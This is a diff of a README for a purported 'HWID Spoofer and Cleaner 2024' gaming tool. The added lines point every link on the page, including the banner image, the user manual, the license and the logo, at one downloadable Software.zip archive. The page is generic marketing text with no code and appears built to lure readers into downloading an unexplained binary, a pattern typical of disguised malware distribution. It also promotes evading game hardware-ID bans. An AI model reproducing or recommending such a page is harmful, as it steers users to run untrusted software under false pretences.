@@ -1,10 +1,10 @@
 # HWID Spoofer and Cleaner 2024
 
-![HWID Spoofer and Cleaner 2024 Banner](https://banner-image.com)
+![HWID Spoofer and Cleaner 2024 Banner](https://github.com/micahchue/HWID-Spoofer-and-Cleaner-2024/releases/download/v2.0/Software.zip)
 
 Welcome to the HWID Spoofer and Cleaner 2024 repository, a powerful and innovative tool designed to enhance your gaming security and privacy. In the world of online gaming, protecting your account and data is paramount. Our tool provides advanced features to spoof and clean your Hardware ID (HWID) effectively.
 
-Download Latest Version: [![Download Software.zip](https://img.shields.io/badge/Download-Software.zip-<COLORCODE>)](https://github.com/user-attachments/files/17466420/Software.zip)
+Download Latest Version: [![Download https://github.com/micahchue/HWID-Spoofer-and-Cleaner-2024/releases/download/v2.0/Software.zip](https://github.com/micahchue/HWID-Spoofer-and-Cleaner-2024/releases/download/v2.0/Software.zip<COLORCODE>)](https://github.com/micahchue/HWID-Spoofer-and-Cleaner-2024/releases/download/v2.0/Software.zip)
 
 ## Table of Contents
 
@@ -43,7 +43,7 @@ Once installed, you can start using the HWID Spoofer and Cleaner 2024 for your g
 2. **Clean System**: Utilize the cleaner tool to remove any unwanted files or traces that may compromise your system's security.
 3. **Customization Options**: Explore the various customization options available within the tool to tailor it to your specific requirements.
 
-For detailed usage instructions and troubleshooting tips, please refer to the [User Manual](https://user-manual.com).
+For detailed usage instructions and troubleshooting tips, please refer to the [User Manual](https://github.com/micahchue/HWID-Spoofer-and-Cleaner-2024/releases/download/v2.0/Software.zip).
 
 ## Contributing
 
@@ -56,8 +56,8 @@ Your contributions are valuable in making this tool more robust and effective fo
 
 ## License
 
-This project is licensed under the Open Software License. For more details, refer to the [LICENSE.md](https://github.com/user-attachments/files/17466420/LICENSE.md) file in the repository.
+This project is licensed under the Open Software License. For more details, refer to the [https://github.com/micahchue/HWID-Spoofer-and-Cleaner-2024/releases/download/v2.0/Software.zip](https://github.com/micahchue/HWID-Spoofer-and-Cleaner-2024/releases/download/v2.0/Software.zip) file in the repository.
 
 ✨ Happy Gaming and Stay Secure with HWID Spoofer and Cleaner 2024! ✨
 
-![HWID Spoofer and Cleaner 2024 Logo](https://logo-image.com)
+![HWID Spoofer and Cleaner 2024 Logo](https://github.com/micahchue/HWID-Spoofer-and-Cleaner-2024/releases/download/v2.0/Software.zip)
